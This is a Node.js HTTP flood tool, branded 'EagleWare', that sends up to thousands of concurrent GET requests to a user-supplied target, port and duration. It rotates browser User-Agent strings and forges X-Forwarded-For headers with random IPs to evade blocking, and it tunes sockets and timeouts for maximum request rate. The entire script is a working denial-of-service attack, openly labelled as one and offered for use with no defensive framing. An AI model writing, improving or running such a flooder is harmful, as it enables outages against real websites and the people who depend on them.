const axios = require('axios');
const async = require('async');
const process = require('process');
const https = require('https');
const http = require('http');
const dns = require('dns');

// npm install axios

const [,, target, port, duration] = process.argv;

if (!target || !port || !duration) {
    console.log('Usage: node https.js <target> <port> <seconds>');
    process.exit(1);
}

// ✅ Fix: Ensure target URL is correctly formatted
const formattedTarget = target.startsWith('http') ? target : `https://${target}`;
const url = `${formattedTarget}:${port}`;
const endtime = Date.now() + (parseInt(duration) * 1000);
let concurrency = 1024; // Max concurrency

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0'
];

// ✅ Fix: Custom DNS resolver to prevent "EAI_AGAIN"
dns.setServers(['8.8.8.8', '1.1.1.1']); // Use Google & Cloudflare DNS

// ✅ Optimized Axios instance with Keep-Alive and higher socket pool
const agentOptions = {
    keepAlive: true,
    maxSockets: 1024, // Increase parallel connections
    maxFreeSockets: 256, // Keep idle connections open
    timeout: 3000, // Reduce timeout to avoid long waits
};

const httpAgent = new http.Agent(agentOptions);
const httpsAgent = new https.Agent(agentOptions);

const axiosInstance = axios.create({
    timeout: 2500, // Reduce request timeout for faster retries
    httpAgent,
    httpsAgent,
    validateStatus: null, // Don't process status codes, just fire requests
    decompress: false, // Avoid response decompression overhead
    maxRedirects: 0 // Don't follow redirects
});

// ✅ Fix: Adaptive Concurrency Control
const adjustConcurrency = () => {
    if (requestCount > 5000) {
        concurrency = Math.max(512, concurrency - 128); // Reduce if too high
    } else if (requestCount < 2000) {
        concurrency = Math.min(2048, concurrency + 128); // Increase if too low
    }
};

const printAttackDetails = () => {
    console.clear();
    const width = process.stdout.columns || 80; 
    console.log(' '.repeat((width - 30) / 2) + "🚀 EagleWare Attack Details 🚀");
    console.log(' '.repeat((width - 40) / 2) + "╔════════════════════════════════╗");
    console.log(' '.repeat((width - 40) / 2) + ` Target: ${target}`);
    console.log(' '.repeat((width - 40) / 2) + ` Port: ${port}`);
    console.log(' '.repeat((width - 40) / 2) + ` Duration: ${duration} seconds`);
    console.log(' '.repeat((width - 40) / 2) + ` Initial Concurrency: ${concurrency}`);
    console.log(' '.repeat((width - 40) / 2) + ` Optimized for High RPS`);
    console.log(' '.repeat((width - 40) / 2) + "╚════════════════════════════════╝");
};

printAttackDetails();

let requestCount = 0;
let errorCount = 0;
let lastLoggedTime = Date.now();

const makeRequest = async () => {
    while (Date.now() <= endtime) {
        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
        const randomIP = `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`; // Fake IP for headers

        try {
            await axiosInstance.get(url, {
                headers: {
                    'User-Agent': userAgent,
                    'X-Forwarded-For': randomIP // Simulating real IPs
                }
            });
            requestCount++;
        } catch (error) {
            errorCount++;
            if (Date.now() - lastLoggedTime > 2000) { // Log errors every 2 seconds
                console.error(`⚠️ Errors: ${errorCount}`);
                lastLoggedTime = Date.now();
            }
        }

        adjustConcurrency(); // Dynamically adjust concurrency
    }
};

// 🚀 Launch attack with improved adaptive concurrency
async.timesLimit(concurrency, concurrency, async () => {
    await makeRequest();
}, (err) => {
    if (err) {
        console.error('❌ Error sending requests:', err);
    }
    console.log(`✅ Attack Finished. Total Requests: ${requestCount}, Errors: ${errorCount}`);
});
